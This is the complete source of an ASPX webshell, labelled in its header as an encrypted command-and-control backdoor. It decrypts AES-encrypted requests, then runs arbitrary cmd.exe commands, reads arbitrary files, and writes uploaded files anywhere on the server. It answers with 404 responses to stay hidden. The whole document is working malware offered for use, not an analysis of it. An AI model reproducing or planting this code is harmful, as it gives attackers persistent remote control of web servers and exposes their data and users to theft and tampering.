<%@ Page Language="JScript" Debug="true" %>
<%
/*
 * Fox ASPX Webshell — AES-256-CBC Encrypted C2 Backdoor
 * ───────────────────────────────────────────────────────
 * Key: SHA256("fox-c2-key-2026") change this
 * Commands: exec, file, upload
 */

var key_hash = System.Security.Cryptography.SHA256.Create().ComputeHash(
    System.Text.Encoding.UTF8.GetBytes("fox-c2-key-2026")
);
var iv_hash = System.Security.Cryptography.MD5.Create().ComputeHash(
    System.Text.Encoding.UTF8.GetBytes("fox-c2-iv-2026")
);

// Decrypt
var input = Request.InputStream;
var reader = new System.IO.StreamReader(input);
var ciphertext_b64 = reader.ReadToEnd();

if (!ciphertext_b64) {
    Response.StatusCode = 404;
    Response.End();
}

var ciphertext = System.Convert.FromBase64String(ciphertext_b64);
var aes = System.Security.Cryptography.Aes.Create();
aes.Key = key_hash;
aes.IV = iv_hash;
aes.Mode = System.Security.Cryptography.CipherMode.CBC;
aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;

try {
    var decryptor = aes.CreateDecryptor();
    var ms = new System.IO.MemoryStream(ciphertext);
    var cs = new System.Security.Cryptography.CryptoStream(ms, decryptor, System.Security.Cryptography.CryptoStreamMode.Read);
    var sr = new System.IO.StreamReader(cs);
    var json = sr.ReadToEnd();
    sr.Close();

    // Parse JSON (simple)
    var cmd_match = /"cmd":"([^"]+)"/.exec(json);
    var arg_match = /"arg":"([^"]*)"/.exec(json);
    var path_match = /"path":"([^"]*)"/.exec(json);
    var data_match = /"data":"([^"]*)"/.exec(json);

    if (!cmd_match) {
        Response.StatusCode = 404;
        Response.End();
    }

    var cmd = cmd_match[1];
    var arg = arg_match ? arg_match[1] : "";
    var result = "";

    switch(cmd) {
        case "exec":
            var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + arg);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            var proc = System.Diagnostics.Process.Start(psi);
            result = proc.StandardOutput.ReadToEnd();
            break;
        case "file":
            if (System.IO.File.Exists(arg)) {
                result = System.Convert.ToBase64String(System.IO.File.ReadAllBytes(arg));
            } else {
                result = "ERROR: File not found";
            }
            break;
        case "upload":
            var path = path_match ? path_match[1] : "";
            var data_b64 = data_match ? data_match[1] : "";
            if (path && data_b64) {
                var raw = System.Convert.FromBase64String(data_b64);
                System.IO.File.WriteAllBytes(path, raw);
                result = "Written " + raw.Length + " bytes";
            } else {
                result = "ERROR: path and data required";
            }
            break;
        default:
            result = "Unknown command: " + cmd;
    }

    // Encrypt response
    var enc = new System.Text.UTF8Encoding();
    var plaintext_bytes = enc.GetBytes(result);
    ciphertext = null;

    var ms2 = new System.IO.MemoryStream();
    var cs2 = new System.Security.Cryptography.CryptoStream(ms2, aes.CreateEncryptor(), System.Security.Cryptography.CryptoStreamMode.Write);
    cs2.Write(plaintext_bytes, 0, plaintext_bytes.Length);
    cs2.Close();
    var encrypted = ms2.ToArray();

    Response.Write(System.Convert.ToBase64String(encrypted));
} catch(e) {
    Response.StatusCode = 404;
    Response.Write("404 Not Found");
}
%>
